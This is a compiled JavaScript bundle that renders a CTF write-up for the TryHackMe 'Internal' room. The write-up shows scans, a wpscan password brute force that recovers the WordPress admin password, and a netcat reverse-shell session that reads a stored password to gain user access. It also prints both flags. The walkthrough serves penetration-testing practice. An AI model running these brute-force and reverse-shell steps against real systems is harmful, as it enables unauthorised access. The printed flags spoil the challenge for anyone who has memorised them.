"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8124],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>h});var r=t(67294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function s(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?s(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):s(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},s=Object.keys(e);for(r=0;r<s.length;r++)t=s[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)t=s[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var l=r.createContext({}),_=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},p=function(e){var n=_(e.components);return r.createElement(l.Provider,{value:n},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},u=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,s=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),c=_(t),u=a,h=c["".concat(l,".").concat(u)]||c[u]||d[u]||s;return t?r.createElement(h,o(o({ref:n},p),{},{components:t})):r.createElement(h,o({ref:n},p))}));function h(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var s=t.length,o=new Array(s);o[0]=u;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[c]="string"==typeof e?e:a,o[1]=i;for(var _=2;_<s;_++)o[_]=t[_];return r.createElement.apply(null,o)}return r.createElement.apply(null,t)}u.displayName="MDXCreateElement"},63106:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>s,metadata:()=>i,toc:()=>_});var r=t(87462),a=(t(67294),t(3905));const s={},o="Internal",i={unversionedId:"Tryhackme/Internal/Internal",id:"Tryhackme/Internal/Internal",title:"Internal",description:"Penetration Testing Challenge",source:"@site/writeups/Tryhackme/Internal/Internal.md",sourceDirName:"Tryhackme/Internal",slug:"/Tryhackme/Internal/",permalink:"/writeups/Tryhackme/Internal/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Inoculation",permalink:"/writeups/Tryhackme/Inoculation/"},next:{title:"Intro to Python",permalink:"/writeups/Tryhackme/Intro to Python/"}},l={},_=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Pre-engagement Briefing",id:"task-1-pre-engagement-briefing",level:2},{value:"Task 2 Deploy and Engage the Client Environment",id:"task-2-deploy-and-engage-the-client-environment",level:2}],p={toc:_},c="wrapper";function d(e){let{components:n,...t}=e;return(0,a.kt)(c,(0,r.Z)({},p,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"internal"},"Internal"),(0,a.kt)("p",null,"Penetration Testing Challenge"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/internal"},"Internal")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Enumeration (Wordpress)"),(0,a.kt)("li",{parentName:"ul"},"Exploitation (Wordpress)")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-pre-engagement-briefing"},"Task 1 Pre-engagement Briefing"),(0,a.kt)("p",null,"You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks."),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"Scope of Work")),(0,a.kt)("p",null,"The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test). The client has asked that you secure two flags (no location provided) as proof of exploitation:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"User.txt"),(0,a.kt)("li",{parentName:"ul"},"Root.txt")),(0,a.kt)("p",null,"Additionally, the client has provided the following scope allowances:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Ensure that you modify your hosts file to reflect internal.thm"),(0,a.kt)("li",{parentName:"ul"},"Any tools or techniques are permitted in this engagement"),(0,a.kt)("li",{parentName:"ul"},"Locate and note all vulnerabilities found"),(0,a.kt)("li",{parentName:"ul"},"Submit the flags discovered to the dashboard"),(0,a.kt)("li",{parentName:"ul"},"Only the IP address assigned to your machine is in scope")),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"(Roleplay off)")),(0,a.kt)("p",null,"I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field."),(0,a.kt)("p",null,"Note - this room can be completed without Metasploit"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"Please do not stream this challenge in the first seven days of release (August 21, 2020)")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"I understand the scope of work")),(0,a.kt)("h2",{id:"task-2-deploy-and-engage-the-client-environment"},"Task 2 Deploy and Engage the Client Environment"),(0,a.kt)("p",null,"Having accepted the project, you are provided with the client assessment environment. Secure the User and Root flags and submit them to the dashboard as proof of exploitation."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Internal$ sudo nmap -A -sS -sC -sV -O 10.10.1.37\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-17 18:34 CEST\nNmap scan report for 10.10.1.37\nHost is up (0.056s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)\n|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)\n|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/17%OT=22%CT=1%CU=38220%PV=Y%DS=2%DC=T%G=Y%TM=5F8B1D\nOS:26%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT      ADDRESS\n1   60.46 ms 10.8.0.1\n2   60.58 ms 10.10.1.37\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 25.42 seconds\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Internal$ gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://internal.thm\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/17 18:36:40 Starting gobuster\n===============================================================\n/.hta (Status: 403)\n/.htpasswd (Status: 403)\n/.htaccess (Status: 403)\n/blog (Status: 301)\n/index.html (Status: 200)\n/javascript (Status: 301)\n/phpmyadmin (Status: 301)\n/server-status (Status: 403)\n/wordpress (Status: 301)\n===============================================================\n2020/10/17 18:36:59 Finished\n===============================================================\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Internal$ wpscan --url http://internal.thm/blog -e u\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \xae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.1\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://internal.thm/blog/ [10.10.1.37]\n[+] Started: Sat Oct 17 18:37:00 2020\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access\n\n[+] http://internal.thm/blog/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).\n | Found By: Rss Generator (Passive Detection)\n |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>\n |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/\n | Last Updated: 2020-08-11T00:00:00.000Z\n | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt\n | [!] The version is out of date, the latest version is 2.4\n | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 2.3 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:01 <=================> (10 / 10) 100.00% Time: 00:00:01\n\n[i] User(s) Identified:\n\n[+] admin\n | Found By: Author Posts - Author Pattern (Passive Detection)\n | Confirmed By:\n |  Rss Generator (Passive Detection)\n |  Wp Json Api (Aggressive Detection)\n |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up\n\n[+] Finished: Sat Oct 17 18:37:11 2020\n[+] Requests Done: 51\n[+] Cached Requests: 7\n[+] Data Sent: 11.81 KB\n[+] Data Received: 472.077 KB\n[+] Memory used: 155.973 MB\n[+] Elapsed time: 00:00:11\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Internal$ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \xae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.1\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://internal.thm/blog/ [10.10.1.37]\n[+] Started: Sat Oct 17 18:37:58 2020\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access\n\n[+] http://internal.thm/blog/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).\n | Found By: Rss Generator (Passive Detection)\n |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>\n |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/\n | Last Updated: 2020-08-11T00:00:00.000Z\n | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt\n | [!] The version is out of date, the latest version is 2.4\n | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 2.3 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:00 <==================> (21 / 21) 100.00% Time: 00:00:00\n\n[i] No Config Backups Found.\n\n[+] Performing password attack on Xmlrpc against 1 user/s\n[SUCCESS] - admin / my2boys\nTrying admin / bratz1 Time: 00:02:33 <===================> (3885 / 3885) 100.00% Time: 00:02:33\n\n[!] Valid Combinations Found:\n | Username: admin, Password: my2boys\n\n[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up\n\n[+] Finished: Sat Oct 17 18:41:32 2020\n[+] Requests Done: 3910\n[+] Cached Requests: 32\n[+] Data Sent: 1.906 MB\n[+] Data Received: 2.295 MB\n[+] Memory used: 833.793 MB\n[+] Elapsed time: 00:03:34\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Internal$ nc -lnvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.1.37] 53194\nLinux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n 16:41:43 up 9 min,  0 users,  load average: 0.59, 0.52, 0.25\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (1071): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@internal:/$ ls /opt\nls /opt\ncontainerd\nwp-save.txt\nwww-data@internal:/$ cat /opt/wp-save.txt\ncat /opt/wp-save.txt\nBill,\n\nAubreanna needed these credentials for something later.  Let her know you have them and where they are.\n\naubreanna:bubb13guM!@#123\nwww-data@internal:/$ python -c \"import pty;pty.spawn('/bin/bash')\"\npython -c \"import pty;pty.spawn('/bin/bash')\"\nwww-data@internal:/$ su aubreanna\nsu aubreanna\nPassword: bubb13guM!@#123\n\naubreanna@internal:/$ cd /home/aubreanna\ncd /home/aubreanna\naubreanna@internal:~$ cat user.txt\ncat user.txt\nTHM{int3rna1_fl4g_1}\naubreanna@internal:~$\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"User.txt Flag")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{int3rna1_fl4g_1}")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"Root.txt Flag")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{d0ck3r_d3str0y3r}")))}d.isMDXComponent=!0}}]);